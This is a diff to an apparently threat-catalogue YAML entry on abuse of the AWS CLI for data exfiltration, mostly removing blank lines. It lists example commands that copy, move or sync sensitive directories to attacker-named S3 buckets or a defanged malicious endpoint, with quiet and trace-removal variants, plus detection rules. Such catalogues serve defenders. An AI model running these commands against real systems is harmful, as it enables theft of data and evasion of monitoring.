@@ -61,27 +61,21 @@ UseCases:
   - Title: Basic directory exfiltration
     Description: Copies a full directory to an S3 bucket using the `cp` command with the `--recursive` flag. Common in ransomware and APT campaigns for bulk exfiltration of documents and sensitive files.
     Command: aws s3 cp C:\Data s3://exfil-bucket/ --recursive
-
   - Title: Stealthy exfiltration with quiet mode
     Description: Executes a recursive file upload while suppressing all CLI output using `--quiet`. This reduces visibility in logs or command history and is often used in script-based or automated exfiltration.
     Command: aws s3 cp /tmp/data s3://bucket-name/ --recursive --quiet
-
   - Title: Exfiltration via custom or accelerated endpoint
     Description: Uses `--endpoint-url` to redirect uploads through a non-standard endpoint such as S3 Transfer Acceleration or an attacker-controlled S3-compatible service. This can help bypass domain-based detections and increase upload speed.
     Command: aws s3 cp data.txt https://malicious-s3[.]domain --endpoint-url
-
   - Title: Selective file exfiltration using filters
     Description: Uploads only targeted file types (e.g., `.pdf`, `.docx`) using a combination of `--include` and `--exclude` flags. Useful for minimizing upload size and avoiding irrelevant files.
     Command: aws s3 cp /reports s3://leakdump/ --recursive --include "*.pdf" --exclude "*"
-
   - Title: Trace-removal via move operation
     Description: Transfers files using the `mv` command, which removes local copies after successful upload. This technique is used to cover tracks and reduce forensic evidence.
     Command: aws s3 mv C:\Sensitive s3://hidden-bucket/ --recursive
-
   - Title: Full backup of compromised system
     Description: Synchronizes the entire system or user profile directory with a remote S3 bucket using `s3 sync`. This allows attackers to maintain persistence over stolen data even if access is later revoked.
-    Command: aws s3 sync C:\Users\Admin s3://backup-bucket/
-
+    Command: aws s3 sync C:\Users s3://backup-bucket/
   - Title: Obfuscation with benign bucket names
     Description: Uploads to buckets with non-suspicious names (e.g., `finance-backups`, `system-logs`) to blend in with legitimate activity or evade basic alert rules.
     Command: aws s3 cp C:\Payroll s3://finance-backups/ --recursive
@@ -90,22 +84,18 @@ Detection:
     Description: >
       Detect AWS CLI connections to rarely used or non-default S3 endpoints such as `s3-accelerate.amazonaws.com`
       or custom S3-compatible domains. These may be used to evade standard monitoring or increase upload speed.
-
   - Type: Command-Line Abuse
     Description: >
       Alert on suspicious use of CLI flags such as `--quiet`, `--recursive`, or combined use of `--include` and `--exclude`,
       particularly when combined with `mv` (which deletes local files post-upload).
-
   - Type: Suspicious Parent Process
     Description: >
       Detect AWS CLI execution triggered by uncommon parent processes (e.g., `mshta`, `wmic`, `powershell`, `winword`),
       which may indicate abuse through malware loaders or LOLBINs.
-
   - Type: Credential Misuse + Exfil Behavior
     Description: >
       Correlate AWS CLI usage with prior credential access events, token use, or suspicious archive creation
       to detect multi-stage exfiltration workflows.
-
   - Type: Snapshot Abuse via AWS CLI
     Description: >
       Monitor for snapshot creation or backup activity linked to credential misuse or suspicious timing.
